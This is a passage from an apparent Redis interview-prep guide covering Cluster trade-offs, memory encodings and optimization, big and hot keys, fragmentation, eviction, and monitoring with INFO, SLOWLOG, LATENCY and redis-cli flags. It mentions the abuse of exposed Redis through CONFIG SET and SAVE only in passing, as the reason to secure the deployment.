Cluster is a trade-off, not a free upgrade. What you give up:

- **Cross-slot multi-key operations** — `MSET`/`MGET`, `SINTERSTORE`, transactions, and Lua across keys only work if all keys share a slot. You must design with **hash tags**, or restructure code to single-key ops.
- **Multiple databases** — Cluster supports **only DB 0**; `SELECT` to another DB is disallowed.
- **Some commands are restricted or behave differently** — commands operating over the whole keyspace (`KEYS`, `SCAN`, `FLUSHALL`) are per-node, not cluster-wide; a few commands are unavailable.
- **Operational complexity** — resharding, more nodes to monitor, cluster-aware clients required, cluster-bus networking.
- **Client requirements** — you need a cluster-aware client that handles MOVED/ASK; a plain client won't route correctly.

The takeaway for interviews: adopt Cluster when data size or write load genuinely exceeds one node — not just for HA (Sentinel does that with far fewer constraints).

### Q14. Cluster vs Sentinel — give the crisp recap.

| | Sentinel | Cluster |
|---|---|---|
| Primary goal | HA for a **single non-sharded** dataset | **Sharding (scale)** + HA |
| Use when | Data fits on one node | Data too big / need write scaling |
| Sharding | None | 16384 hash slots |
| Failover | External Sentinel processes | Built-in (gossip), no Sentinel |
| Multi-key ops | Full support | Same-slot only (hash tags) |
| Databases | All 16 | DB 0 only |
| Client | Sentinel-aware | Cluster-aware (MOVED/ASK) |
| Complexity | Lower | Higher |

**One-liner:** Sentinel = *keep one dataset available*; Cluster = *spread a dataset (too big for one node) across shards and keep it available*. Choose Sentinel for HA on a dataset that fits on one node; choose Cluster when you must scale beyond one node. Don't pay Cluster's complexity just for failover — see [[high-availability-sentinel]].

### Q15. Do clients need special support for Cluster? What does a good client do?

Yes — you need a **cluster-aware (smart) client**. A plain single-node client will just get `MOVED` errors and can't route.

A good cluster client:

1. On connect, calls `CLUSTER SLOTS` (or `CLUSTER SHARDS`) to build the **slot → node map**.
2. For each command, computes `CRC16(key) mod 16384` (respecting hash tags) and sends it to the owning master.
3. On **MOVED**, updates its cached map and retries; on **ASK**, sends `ASKING` + the command to the indicated node for that one request without updating the map.
4. Optionally routes reads to replicas after `READONLY`.
5. Rejects/handles cross-slot multi-key commands (many clients let you pin keys with hash tags).

Examples: `redis-py` (`RedisCluster`), Lettuce/Jedis (Java), `ioredis` (Node), `go-redis`. Interview tip: if someone says "I switched to Cluster and everything broke," the usual cause is a **non-cluster-aware client** or **cross-slot** commands.

### Q16. How does Redis scale horizontally — the concise senior answer?

Redis scales horizontally with **Redis Cluster**, which **shards** the keyspace across multiple master nodes:

1. **Slots** — the keyspace is split into **16384 hash slots**; each key maps to one via `CRC16(key) mod 16384`, and each master owns a subset of slots. Sharding is deterministic math, not a proxy.
2. **Smart clients** — cluster-aware clients cache the slot→node map and route each command to the owning node, correcting via **MOVED** (permanent) / **ASK** (during migration) redirects.
3. **Elastic capacity** — you add nodes and **reshard** (move slots live) to grow; the ASK/MOVED protocol keeps it transparent.
4. **Co-location** — multi-key ops require one slot, so you use **hash tags** `{…}` to keep related keys together.
5. **Built-in HA** — each master has replicas; the cluster's gossip protocol detects failures and promotes a replica automatically — no Sentinel.

The caveats that show seniority: it's still **async** (not strongly consistent), you lose **cross-slot** multi-key ops and multiple DBs, and it's only worth the added complexity when the data or write load truly exceeds a single node.

## Memory Management & Optimization

### Summary

**What this topic covers**

Redis is **memory-bound** — everything lives in RAM plus per-object overhead — so memory efficiency is a first-class engineering concern, not an afterthought. This topic covers Redis's internal **encodings** (the compact layouts it uses for small aggregates and when it converts to the general structure), how to **find memory hogs** (`INFO memory`, `MEMORY USAGE`, `MEMORY DOCTOR`, `--bigkeys`/`--memkeys`), the two classic scaling problems — **big keys** and **hot keys** — **memory fragmentation** (RSS vs used_memory, jemalloc, active defrag), the per-key overhead that makes millions of tiny keys wasteful (and why packing fields into hashes helps), and the interaction with `maxmemory`/eviction/TTLs. The 15 questions build toward the everyday operational question: **"Redis is using too much memory — how do I reduce it?"**

**Mental model**

Think of Redis memory as **data + structure overhead + fragmentation**, and your job as squeezing all three. The data is your values. The *structure overhead* is where Redis is cleverer than it looks: for **small** collections it stores them in a single compact, cache-friendly blob (a **listpack**/ziplist, or an **intset** for all-integer sets) instead of full hashtables/skiplists with pointers per element — dramatically less memory, at the cost of O(N) access, which is fine because they're small. Cross a configurable **threshold** (entries or value size) and Redis silently **converts** to the general, pointer-heavy structure that's O(1) but fatter. `OBJECT ENCODING` tells you which representation a key is in. The *fragmentation* is the gap between what Redis asked for (`used_memory`) and what the OS actually reserved (RSS) — the allocator (jemalloc) can't always hand back freed space. So optimizing memory is: keep collections under the encoding thresholds, avoid pathological **big keys** and **hot keys**, prefer a few well-packed hashes over millions of tiny top-level keys, and manage fragmentation. `maxmemory` + an eviction policy is your backstop when you still run out.

**Key terms**

- **used_memory** — bytes Redis has allocated for data + overhead (what Redis thinks it's using).
- **RSS (used_memory_rss)** — resident memory the OS attributes to the process; ≥ used_memory due to fragmentation/allocator.
- **mem_fragmentation_ratio** — `RSS / used_memory`; >1 means fragmentation, <1 means swapping (bad).
- **Encoding** — the internal representation of a value; revealed by `OBJECT ENCODING key`.
- **listpack / ziplist** — a compact flat array layout for small hashes/lists/sorted sets; memory-efficient, O(N).
- **intset** — a sorted packed integer array for sets containing only integers.
- **embstr vs raw** — small strings stored inline with the object header (embstr, ≤44 bytes) vs separately allocated (raw).
- **skiplist / hashtable** — the general, O(1)-ish structures used once a collection exceeds its threshold.
- **big key** — a single key with a huge value or millions of elements; causes O(N) blocking, uneven memory, slow migration/deletion.
- **hot key** — a key receiving a disproportionate share of traffic; a single-node bottleneck even in Cluster.
- **jemalloc** — Redis's default memory allocator; supports **active defrag**.
- **per-key overhead** — the fixed cost (dict entry, `robj` header, optional expire entry) attached to *every* key.

**Why interviewers ask this**

Because memory is where Redis costs money and where it falls over, and the failure modes are subtle. Juniors think "it's in RAM, add more RAM." Seniors reason about *why* it's using so much and reduce it: they know **encodings** and that keeping collections under thresholds can cut memory by an order of magnitude; they know **big keys** block the single-threaded loop and wreck p99 (tying back to the single-threaded model); they know **hot keys** aren't fixed by Cluster because one key still lives on one node; and they can read `INFO memory` and `mem_fragmentation_ratio` to distinguish fragmentation from overuse from swapping. The flagship diagnostic question — "Redis is using too much memory / p99 spiked, what do you do?" — is a senior filter: the strong answer is a methodical `--bigkeys` / `MEMORY USAGE` / `OBJECT ENCODING` investigation, not "restart it."

**Common confusions**

- "In-memory means I can't control memory usage" — you have strong levers: encodings, key design, `maxmemory`, eviction, TTLs.
- "Big values are fine as long as I have RAM" — a big key causes **O(N)** ops that block the single-threaded server; it's a *latency* problem, not just a space one.
- "Cluster solves hot keys" — no. A hot key hashes to one slot on one node; sharding spreads *different* keys, not load on a *single* key.
- "used_memory is what the OS sees" — the OS sees **RSS**, which is larger; the gap is fragmentation (`mem_fragmentation_ratio`).
- "`DEL` a big key is fine" — a large `DEL` blocks; use **`UNLINK`** (async free) instead.
- "Millions of tiny keys is efficient" — each key carries fixed overhead; **packing fields into hashes** is far cheaper.
- "Eviction and expiry are the same" — expiry is TTL-driven per key; eviction is memory-pressure-driven under `maxmemory`.

**What follows from this topic**

Memory pressure is *why* people reach for [[redis-cluster]] (data too big for one node) — but this topic argues you should first check whether encodings and key design can shrink the footprint. It connects to [[persistence]] (RDB `fork()` + copy-on-write can transiently double memory; big datasets make fork pauses worse) and to eviction/`maxmemory` (the backstop when you're full). Big keys tie directly back to Redis being **single-threaded** — the reason an O(N) op on a huge key is catastrophic. Hot keys connect to caching strategy and client-side caching.

### Q1. Why is memory management such a big deal in Redis?

Because Redis is **memory-bound**: the entire dataset lives in RAM, plus non-trivial per-object and per-key overhead. Unlike a disk-based database that pages data in and out, Redis's working set *is* its memory footprint. That has three consequences:

1. **Cost** — RAM is expensive; an inefficient data model directly inflates your bill or forces premature sharding.
2. **Capacity ceiling** — one node is bounded by its RAM; hit `maxmemory` and you start evicting or rejecting writes.
3. **Latency coupling** — memory problems (big keys, fragmentation, fork during snapshot) show up as **latency** because Redis is single-threaded.

So "make it use less memory" is a routine, high-leverage task: choosing the right data types and encodings, packing keys, and watching for big/hot keys can cut usage dramatically without adding hardware.

### Q2. Explain Redis's internal encodings and how conversion works.

For each data type, Redis picks between a **compact small representation** and a **general large one**, converting automatically once a threshold is crossed:

| Type | Small (compact) encoding | Converts to | Threshold configs |
|---|---|---|---|
| Hash | `listpack` | `hashtable` | `hash-max-listpack-entries`, `hash-max-listpack-value` |
| List | `listpack` (quicklist of listpacks) | `quicklist` | `list-max-listpack-size` |
| Set (all ints) | `intset` | `hashtable` (or listpack) | `set-max-intset-entries` |
| Set (non-int, small) | `listpack` | `hashtable` | `set-max-listpack-entries` |
| Sorted set | `listpack` | `skiplist` | `zset-max-listpack-entries`, `zset-max-listpack-value` |
| String | `embstr` (≤44B) / `int` | `raw` | fixed |

The small encodings pack everything into a **flat array** — tiny memory footprint, cache-friendly, but **O(N)** access (fine when small). Past the threshold Redis switches to the pointer-based `hashtable`/`skiplist`/`quicklist` — O(1)-ish but with per-element overhead. The conversion is **one-way** within a key's lifetime (it doesn't convert back down). Inspect with `OBJECT ENCODING`.

### Q3. What do listpack, intset, embstr, and skiplist mean in practice?

- **listpack** (successor to **ziplist**) — a single contiguous, packed byte array holding all entries of a small hash/list/sorted-set. No per-element pointers, so very memory-efficient; access is O(N) because you scan it. Used while the collection stays under its threshold.
- **intset** — a set whose members are **all integers**, stored as a **sorted array of ints**. Extremely compact and allows binary search. Add a non-integer or exceed `set-max-intset-entries` → it converts to a listpack/hashtable.
- **embstr vs raw** — short strings (≤44 bytes) are stored **embedded** in the same allocation as the object header (embstr) — one allocation, cache-friendly. Longer strings use **raw** (header + separately allocated buffer). Integer-valued strings use the `int` encoding (stored as a long).
- **skiplist / hashtable** — the general structures for large sorted sets (skiplist + hashtable) and large hashes/sets (hashtable): O(1)/O(log N) access but with per-element node/pointer overhead.

`OBJECT ENCODING key` shows exactly which one a given key currently uses.

### Q4. How does keeping collections under the thresholds save memory? Give a concrete example.

Under the threshold, a collection is one packed **listpack** with almost no per-element overhead. Over it, every element gains dict-entry/pointer overhead — often **5–10×** more memory per element.

Concrete example — storing many user records:

```bash
# Bad: one giant hash of 10M fields -> hashtable encoding, big-key problems
HSET all_users user:1 alice user:2 bob ...   # millions of fields

# Good: many small hashes, each under hash-max-listpack-entries (128)
HSET user:1 name alice age 30 city london    # listpack, tiny
HSET user:2 name bob   age 25 city paris      # listpack, tiny
```

Each small `user:N` hash stays a listpack — a few dozen bytes of overhead. The right granularity: **many small collections each below the threshold**, rather than one huge hashtable-encoded key (which is *also* a big key). Conversely, don't go so small that you have millions of top-level keys (per-key overhead, Q10) — pack a handful of related fields per hash. Tune `hash-max-listpack-entries`/`-value` if your records are slightly larger than defaults but still want listpack efficiency.

### Q5. How do you find what's using all the memory?

A layered investigation:

```bash
INFO memory                       # used_memory, used_memory_rss, maxmemory, fragmentation ratio
MEMORY DOCTOR                     # human-readable diagnosis of memory issues
MEMORY USAGE user:123             # bytes used by a specific key (incl. overhead)
redis-cli --bigkeys               # samples the keyspace, reports the biggest key per type
redis-cli --memkeys               # like --bigkeys but ranks by memory (7.x)
DEBUG OBJECT user:123             # encoding, serializedlength, etc. (low-level)
OBJECT ENCODING user:123          # which internal encoding
```

Workflow: start with `INFO memory` to see totals and fragmentation, run `MEMORY DOCTOR` for a quick verdict, then `--bigkeys`/`--memkeys` to find the offenders, and drill into suspects with `MEMORY USAGE` and `OBJECT ENCODING`. `--bigkeys`/`--memkeys` **sample** with `SCAN` (safe on a live server — they don't block like `KEYS`). This sequence turns "Redis is fat" into "these 3 keys are 60% of memory."

### Q6. What is a big key, why is it dangerous, and how do you deal with it?

A **big key** is a single key that's disproportionately large — a multi-MB string, or a hash/list/set/zset with millions of elements.

Why dangerous (mostly a **latency**, not just space, problem, because Redis is single-threaded):

- **O(N) commands block the whole server** — `SMEMBERS`, `HGETALL`, `LRANGE 0 -1`, `SORT` on a huge key stall every other client.
- **Deletion blocks** — `DEL bigkey` frees millions of elements synchronously, freezing the loop. Use **`UNLINK`** (frees asynchronously in a background thread).
- **Uneven memory & slow migration** — one node/slot bloats; resharding or replication of that key is slow.
- **Expiry spikes** — a big key expiring frees a lot at once, causing a latency blip.

How to deal:

- **Split/shard** the key — e.g. `user:events:{2026-07}` per-month instead of one unbounded list; bucket a giant set into `set:part:0..N`.
- **Cap collections** — trim lists (`LTRIM`), bound zsets, set TTLs.
- **Read incrementally** — `HSCAN`/`SSCAN`/`ZSCAN` instead of `HGETALL`/`SMEMBERS`.
- **Delete with `UNLINK`**, not `DEL`.

### Q7. What is a hot key, and why doesn't Cluster fix it?

A **hot key** is a single key receiving a disproportionate share of traffic — e.g. a global config, a trending item's counter, a celebrity's profile — so one key becomes a throughput bottleneck.

Cluster **doesn't** fix it because sharding distributes *different keys* across nodes by slot. A hot key hashes to **one slot on one node**; all its traffic still lands on that single node's single thread. Sharding spreads *breadth* of keys, not *depth* of load on *one* key.

Mitigations:

- **Client-side caching** — cache the value in the app (Redis 6 **client-side caching / tracking** with invalidation) so most reads never hit Redis.
- **Local replicas / read replicas** — serve the hot read from multiple replicas (reads only).
- **Split the key** — shard a hot counter into N sub-counters (`counter:{shard0..N}`) and sum them, spreading writes across slots.
- **Add a small TTL'd local cache** in front to absorb bursts.

Diagnosis: `redis-cli --hotkeys` (with an LFU maxmemory-policy) or monitoring per-key access.

### Q8. Explain memory fragmentation, RSS vs used_memory, and active defrag.

**used_memory** is what Redis asked the allocator for. **RSS (used_memory_rss)** is what the OS actually reserves for the process. **`mem_fragmentation_ratio = RSS / used_memory`**:

- **> 1** (e.g. 1.1–1.5) — normal fragmentation: the allocator holds pages it can't return because live objects are scattered across them. Common after lots of churn (writes/deletes of varying sizes).
- **>> 1.5** — significant fragmentation worth addressing.
- **< 1** — Redis memory is **swapped to disk** — bad, causes severe latency; fix by adding RAM / disabling swap.

Redis uses **jemalloc** by default, which supports **active defragmentation**: when enabled, Redis incrementally moves objects to compact memory *online*, without a restart:

```bash
CONFIG SET activedefrag yes
CONFIG SET active-defrag-ignore-bytes 100mb
CONFIG SET active-defrag-threshold-lower 10
```

Before active defrag existed, the only fix was a restart (or failover to a fresh replica). It's a background, self-throttling process controlled by thresholds so it doesn't hurt latency.

### Q9. Where does per-key overhead come from, and why does it matter?

Every key, regardless of value size, carries **fixed overhead**:

- A **dict entry** in the top-level keyspace hashtable (key pointer, value pointer, next-pointer).
- A **`robj`** header on the value (type, encoding, refcount, LRU/LFU bits).
- The **key string** itself (an SDS).
- If it has a TTL, an entry in the separate **expires** dict.

That's roughly on the order of ~50–100 bytes of overhead **per key** before any value. So **millions of tiny keys** (e.g. `user:1:name`, `user:1:age`, `user:1:city` as separate strings) waste enormous memory in overhead alone.

The fix: **pack related fields into a hash** — `HSET user:1 name alice age 30 city london` is one key (one set of overhead) and, while small, uses the compact **listpack** encoding. This is the single most common Redis memory optimization: fewer keys, more fields per key.

### Q10. Why prefer a hash over many top-level keys? Show it.

Because you pay per-key overhead **once** instead of per field, and small hashes use the compact listpack encoding.

```bash
# Wasteful: 3 keys per user, 3x per-key overhead, 3 robj headers
SET user:1:name  alice
SET user:1:age   30
SET user:1:city  london

# Efficient: 1 key, listpack-encoded, fields packed together
HSET user:1 name alice age 30 city london
OBJECT ENCODING user:1     # => "listpack"  (tiny)
```

Instagram's classic case study did exactly this — bucketing millions of ID→value mappings into hashes of ~1000 fields each (kept under `hash-max-listpack-entries`) cut memory by roughly **5×** versus one string key per ID.

The rule: group naturally-related fields into a hash sized to stay **under the listpack threshold**. You get fewer keys (less overhead) *and* the compact encoding — a double win. Just don't make the hash so big it converts to hashtable or becomes a big key.

### Q11. How do maxmemory, eviction, and TTLs work together to bound memory?

Three complementary controls:

- **`maxmemory`** — the hard cap. When `used_memory` reaches it, Redis applies the eviction policy (or rejects writes).
- **Eviction policy** (`maxmemory-policy`) — what to drop under pressure: `noeviction` (default — reject writes with an error), `allkeys-lru`/`allkeys-lfu` (evict any key by recency/frequency — treat Redis as a cache), `volatile-lru`/`volatile-ttl`/`volatile-lfu` (evict only keys *with* a TTL). Choose `allkeys-lru`/`lfu` for a pure cache; `volatile-*` when some keys must never be evicted.
- **TTLs** — proactively bound growth by expiring data you no longer need (`EXPIRE`, `SET ... EX`). Expiry (TTL) is **distinct** from eviction (memory pressure) — but TTLs reduce how often eviction has to fire.

```bash
CONFIG SET maxmemory 4gb
CONFIG SET maxmemory-policy allkeys-lru
```

Together: set `maxmemory` a safe margin below the box's RAM (leaving room for COW during snapshots + fragmentation), pick an eviction policy matching whether Redis is a cache or a store, and use TTLs to keep the working set from growing unbounded in the first place.

### Q12. Which data types are more memory-efficient for which jobs?

Match the type to the access pattern *and* memory profile:

- **Bitmap** — store a boolean per user id (e.g. "has user N done X?") in a single string; 1 bit each. A **bitmap** for 10M user flags is ~1.2MB vs a set of 10M ids (hundreds of MB). Use `SETBIT`/`BITCOUNT`.
- **HyperLogLog** — approximate unique counts (cardinality) in ~12KB *regardless* of how many items, vs a set that grows with every element. Use for "how many unique visitors" when exact isn't required.
- **Hash (listpack)** — packing related fields; far cheaper than many string keys (Q10).
- **intset** — a set of integers is stored as a packed int array (very compact) until it grows past `set-max-intset-entries`.
- **Sorted set** — necessary for leaderboards/ranges but heavier (skiplist) once large; keep small ones under the zset listpack threshold.

The senior instinct: before storing millions of ids in a set, ask "do I need the ids, or just membership (bitmap) / a count (HyperLogLog)?" — the probabilistic/bit types trade exactness for order-of-magnitude memory savings.

### Q13. Spot the memory problem: what's wrong with this design?

```bash
# A per-user "seen items" set, unbounded, no TTL
SADD user:123:seen item:1 item:2 ... item:5000000   # grows forever
SMEMBERS user:123:seen                               # called on every request
```

Several red flags:

1. **Big key** — a set with millions of members. `SMEMBERS` on it is **O(N)** and blocks the single-threaded server, spiking p99 for *everyone*.
2. **Unbounded growth, no TTL** — it only ever grows; memory climbs until eviction/OOM.
3. **Wrong access pattern** — reading the whole set every request is wasteful; you probably only need a **membership check** (`SISMEMBER`) which is O(1).

Fixes:

- Use `SISMEMBER user:123:seen item:X` instead of `SMEMBERS`.
- **Cap it**: keep only recent items (a capped list/zset trimmed by time), or use a **HyperLogLog** if you only need approximate "how many seen," or a **bitmap** if item ids are dense integers.
- Add a **TTL** so inactive users' data expires.
- Delete large ones with **`UNLINK`**, never `DEL`.

### Q14. Redis is using too much memory / p99 just spiked — how do you diagnose and reduce it?

A methodical playbook, not "add RAM / restart":

1. **Measure** — `INFO memory`: check `used_memory`, `used_memory_rss`, `maxmemory`, and `mem_fragmentation_ratio`. Is it real usage, fragmentation (RSS ≫ used), or swapping (ratio < 1)?
2. **Quick verdict** — `MEMORY DOCTOR`.
3. **Find offenders** — `redis-cli --bigkeys` / `--memkeys` to find the biggest keys; `--hotkeys` for traffic skew. Drill in with `MEMORY USAGE key` and `OBJECT ENCODING key`.
4. **Classify the cause**:
   - **Big key** → split/cap it, read with SCAN-family, delete with `UNLINK`. (Also explains a **latency** spike via O(N).)
   - **Encoding blew past threshold** → restructure so collections stay in listpack, or tune thresholds.
   - **Too many tiny keys** → pack into hashes.
   - **Fragmentation** → enable `activedefrag`; if swapping, add RAM / disable swap.
   - **No bound** → add TTLs, set `maxmemory` + an eviction policy.
5. **Backstop** — set/confirm `maxmemory` and an appropriate `maxmemory-policy` so pressure degrades gracefully.

The p99 angle specifically points at a **big key + O(N) command** (or a fork during RDB snapshot) — tie the memory finding to the latency symptom.

### Q15. Give the concise senior answer: "Redis memory is too high — reduce it."

Reduce Redis memory in this order of leverage:

1. **Fix key design** — pack many tiny keys into **hashes** (fewer per-key overheads), and size collections to stay under the **listpack/intset thresholds** so they use compact encodings. This alone is often multi-× savings.
2. **Kill big keys** — find them with `--bigkeys`/`MEMORY USAGE`, then split/cap them (TTLs, `LTRIM`, sharding) and delete with `UNLINK`.
3. **Use cheaper types** — **bitmaps** for dense boolean flags, **HyperLogLog** for approximate uniques, instead of huge sets.
4. **Bound growth** — TTLs on everything ephemeral; set **`maxmemory`** + a sensible **eviction policy** (`allkeys-lru`/`lfu` for a cache) as a backstop.
5. **Handle fragmentation** — check `mem_fragmentation_ratio`; enable **active defrag**; ensure you're not swapping.
6. **If it genuinely doesn't fit** — only then scale out with [[redis-cluster]].

The through-line: Redis memory is controllable. Encodings and key design first, big/hot-key hygiene second, `maxmemory`/eviction as the safety net, sharding as the last resort.
## Operations, Monitoring & Security

### Summary

**What this topic covers**

Running Redis as a production service rather than a laptop toy: how to observe it, how to keep it healthy, and how to keep it from being trivially owned. Three concern areas live here. (1) **Observability** — `INFO`, `SLOWLOG`, `LATENCY`, `MONITOR`, and the `redis-cli` diagnostic flags (`--stat`, `--latency`, `--bigkeys`), plus which metrics actually deserve an alert. (2) **Operational hygiene** — backups, live configuration (`CONFIG GET`/`SET`/`REWRITE`), connection management and pooling, `maxmemory` and eviction as a safety net, and restart/upgrade strategy. (3) **Security** — the single most consequential Redis fact operationally: an internet-exposed, unauthenticated Redis is a remote-code-execution box. Bind, `protected-mode`, `requirepass`, ACLs (Redis 6+), TLS, `rename-command`, non-root, `CLIENT KILL`. The 16 questions here take you from "read `INFO`" to "walk me through how you'd monitor and secure a Redis fleet."

**Mental model**

Treat Redis as a single-threaded, memory-bound process whose worst enemy is *anything that stalls the event loop or exhausts RAM*. So monitoring is really about answering three questions fast: **Am I about to run out of memory?** (`used_memory` vs `maxmemory`, `evicted_keys`, fragmentation), **Is something blocking the loop?** (`SLOWLOG`, `LATENCY`, big-key/O(N) commands, fork pauses), and **Is my topology healthy?** (`role`, `master_link_status`, replication lag, `rejected_connections`). Security has an equally simple model: Redis was designed to run on a trusted network with no auth by default, so *you* are responsible for the perimeter. Anyone who can send commands can run `CONFIG SET dir`, `SET`, `SAVE` and write a file anywhere the process can write — cron jobs, SSH keys, webshells. The whole security posture reduces to "no untrusted party can reach the port, and even trusted parties authenticate."

**Key terms**

- **`INFO`** — the primary introspection command; returns key/value metrics grouped into sections (server, clients, memory, persistence, stats, replication, cpu, keyspace).
- **`SLOWLOG`** — an in-memory log of commands whose execution exceeded `slowlog-log-slower-than` microseconds; the first stop for "what's slow."
- **`LATENCY`** — the latency-monitoring subsystem (`LATENCY LATEST`/`HISTORY`/`DOCTOR`) that records spike events and their causes.
- **`MONITOR`** — streams every command the server processes; priceless for debugging, a serious throughput hit, never left on in prod.
- **`mem_fragmentation_ratio`** — RSS ÷ used_memory; >1.5 means allocator fragmentation, <1 means swapping (bad).
- **hit rate** — `keyspace_hits / (keyspace_hits + keyspace_misses)`; the headline cache-efficiency number.
- **`maxclients`** — the connection cap; hitting it produces `rejected_connections`.
- **`protected-mode`** — a safety default (Redis 3.2+) that refuses external connections when no auth/bind is configured.
- **ACL** — Redis 6 access-control lists: named users with per-command and per-key permissions.
- **`rename-command`** — config that renames or disables dangerous commands (`FLUSHALL`, `CONFIG`, `KEYS`, `DEBUG`).
- **THP** — transparent huge pages; a kernel feature that must be disabled because it inflates fork latency.

**Why interviewers ask this**

This topic separates people who've *operated* Redis from people who've only *called* it. A junior answer to "Redis is slow" is "add more memory." A senior answer is "let me check `SLOWLOG` and `LATENCY DOCTOR`, look for a fork pause or a big-key O(N), confirm we're not swapping, and check `mem_fragmentation_ratio`." Security is an even sharper filter: candidates who don't immediately say "never expose Redis to the internet" have not been near a real incident, and the history of mass Redis compromises (crypto-miners writing cron jobs via `CONFIG SET dir` + `SAVE`) is table stakes for anyone claiming senior ops experience. Interviewers also probe whether you know that connection churn — opening a connection per request instead of pooling — is a real production failure mode, not a micro-optimization.

**Common confusions**

- "Redis is secure by default." No. Historically it had *no* auth and bound to all interfaces; `protected-mode` is a guardrail, not authentication.
- "`MONITOR` is fine to leave running." It streams every command to your client and can cut throughput dramatically — debugging only.
- "High memory means I need a bigger box." Often it's fragmentation, a big key, or missing TTLs — measure before scaling.
- "`used_memory` is what the OS sees." No — that's `used_memory_rss`; the ratio between them is the fragmentation/swap signal.
- "Eviction and expiry are the same." Expiry is TTL-driven; eviction is `maxmemory`-pressure-driven. `evicted_keys` climbing means memory pressure, not TTLs firing.
- "`requirepass` and ACLs are redundant." `requirepass` is effectively the legacy `default` user's password; ACLs let you scope *what* an authenticated user can do.

**What follows from this topic**

Monitoring feeds directly into **Scenario & Playbooks** — every "diagnose this latency/OOM" scenario is solved with the tools introduced here. The eviction/`maxmemory` safety net ties back to the persistence and memory-encoding topics. Security connects to deployment topology: Sentinel and Cluster multiply the number of ports and connections you must protect. And the operational posture here — pooling, backups, live config — is what makes the design patterns in later topics survivable in production rather than just correct on a whiteboard.

### Q1. What does the `INFO` command tell you, and which fields do you actually watch?

`INFO` returns server metrics grouped into sections. You can request one section, e.g. `INFO memory`.

```bash
INFO memory
INFO stats
INFO replication
```

The fields that earn a dashboard slot:

- **memory** — `used_memory` (logical bytes Redis thinks it uses), `used_memory_rss` (what the OS sees), `mem_fragmentation_ratio` (RSS/used; >1.5 = fragmentation, <1 = **swapping**), `maxmemory`.
- **stats** — `instantaneous_ops_per_sec` (throughput), `keyspace_hits` / `keyspace_misses` (compute **hit rate** from these), `evicted_keys` (memory pressure), `expired_keys` (TTLs firing), `rejected_connections` (hitting `maxclients`).
- **clients** — `connected_clients`, `blocked_clients` (clients parked in `BLPOP`/`WAIT`).
- **persistence** — `rdb_last_bgsave_status`, `aof_last_write_status` (must be `ok`), `rdb_changes_since_last_save`.
- **replication** — `role` (master/slave), and on a replica `master_link_status` (`up`/`down`) plus `master_repl_offset` lag.

The three questions `INFO` answers fast: am I running out of memory, is persistence failing, and is replication healthy.

### Q2. How do you compute cache hit rate and why does it matter?

Hit rate = `keyspace_hits / (keyspace_hits + keyspace_misses)`.

```bash
INFO stats
# keyspace_hits:948210
# keyspace_misses:51790  -> hit rate ~94.8%
```

Note these are **cumulative since start**, so for a live rate you sample twice and diff. A healthy read-through cache usually sits well above 90%. A low or falling hit rate means one of: TTLs too short (keys expire before reuse), the wrong keys are cached, a cold cache after restart/flush, or eviction thrashing (working set > `maxmemory`, so Redis evicts keys you're about to need). It's the single most useful cache-health number, and it's diagnostic — pair a low hit rate with rising `evicted_keys` and you've found eviction thrashing; pair it with high `expired_keys` and your TTLs are too aggressive.

### Q3. What is `SLOWLOG` and how do you use it?

`SLOWLOG` is an in-memory ring buffer of commands whose *execution* time (not including network/IO wait) exceeded a threshold.

```bash
CONFIG SET slowlog-log-slower-than 10000   # microseconds -> 10ms
CONFIG SET slowlog-max-len 128
SLOWLOG GET 10                             # last 10 slow entries
SLOWLOG RESET
```

Each entry shows the timestamp, duration, and the exact command + args. It's the **first stop** when someone says "Redis is slow," because on a single-threaded server one slow command stalls everyone. `SLOWLOG` is where you catch the classic O(N) offenders — someone running `KEYS *`, a `SMEMBERS`/`LRANGE`/`HGETALL` on a giant key, a `SORT` over a big list. Set the threshold low enough to catch problems (10ms is a common start) but not so low that noise floods the buffer.

### Q4. How do you use the `LATENCY` monitoring subsystem, and what causes latency spikes?

Redis has a built-in latency monitor that records spike events and their sources.

```bash
CONFIG SET latency-monitor-threshold 100   # ms
LATENCY LATEST      # latest spike per event type
LATENCY HISTORY fork
LATENCY DOCTOR      # human-readable analysis + advice
LATENCY RESET
```

`LATENCY DOCTOR` is the fastest triage — it names the likely cause. The usual spike sources:

- **fork** — `BGSAVE`, `BGREWRITEAOF`, and replica sync all `fork()`; on a big dataset the copy-on-write page setup pauses the main thread.
- **swap** — if Redis memory is swapped to disk, every access can hit disk. **Never let Redis swap** (`mem_fragmentation_ratio` < 1 is the tell).
- **transparent huge pages (THP)** — the kernel feature massively inflates fork-related latency; **disable it**.
- **big-key operations** — an O(N) command on a large aggregate.
- **large `DEL`** — freeing a huge key blocks the thread; use `UNLINK` for async free.
- **expiry cycles** — a burst of keys expiring at once.

### Q5. What is `MONITOR` and when should you (not) use it?

`MONITOR` streams *every* command the server processes to your client in real time.

```bash
redis-cli MONITOR
# 1690000000.123 [0 10.0.0.5:52344] "GET" "user:123"
```

It's invaluable for debugging — you see exactly what your app is sending, in what order, from which client. But it comes at a **heavy performance cost**: the server has to format and dispatch every command to the monitor stream, which can slash throughput by 50%+ under load. **Never leave `MONITOR` running in production**, and never point it at a busy master to "just take a look" — run it briefly, against a replica if possible, and disconnect. For sustained visibility use `SLOWLOG` and `LATENCY` instead.

### Q6. What do the `redis-cli` diagnostic flags do?

`redis-cli` ships operational tools beyond the REPL:

```bash
redis-cli --stat        # live ops/sec, memory, clients, one line/sec (like vmstat)
redis-cli --latency     # continuously sample PING RTT (min/max/avg ms)
redis-cli --latency-history
redis-cli --bigkeys     # scan the keyspace, report the biggest key per type
redis-cli --memkeys     # like --bigkeys but by memory
redis-cli --hotkeys     # requires LFU eviction; finds most-accessed keys
```

`--stat` is your at-a-glance health line. `--latency` measures round-trip latency to spot network/server stalls. `--bigkeys` and `--memkeys` do a non-blocking `SCAN` to find the outsized keys that cause O(N) latency and lumpy memory — run them when investigating a spike or before a Cluster resharding. `--hotkeys` (needs an LFU policy) surfaces the hot key that's bottlenecking one node.

### Q7. Which operational metrics do you alert on?

The alert list, roughly in order of "wakes you at 3am":

- **Memory** — `used_memory` as a % of `maxmemory` (alert well before 100%; noeviction + full = rejected writes).
- **Persistence failures** — `rdb_last_bgsave_status` or `aof_last_write_status` != `ok` (you're flying without backups).
- **Evictions** — `evicted_keys` climbing (working set exceeds capacity; hit rate will suffer).
- **Hit rate** — sustained drop below your baseline.
- **Replication** — replica `master_link_status:down` or growing offset lag; blocked failover.
- **Connections** — `connected_clients` near `maxclients`, or any `rejected_connections`.
- **Blocked clients** — `blocked_clients` unexpectedly high.
- **Latency** — p99 command latency / `LATENCY LATEST` spikes.
- **CPU** — the single core Redis runs on saturating (used_cpu_sys/user).

Distinguish leading indicators (rising memory %, rising evictions) from lagging ones (rejected writes) and alert on the leading ones.

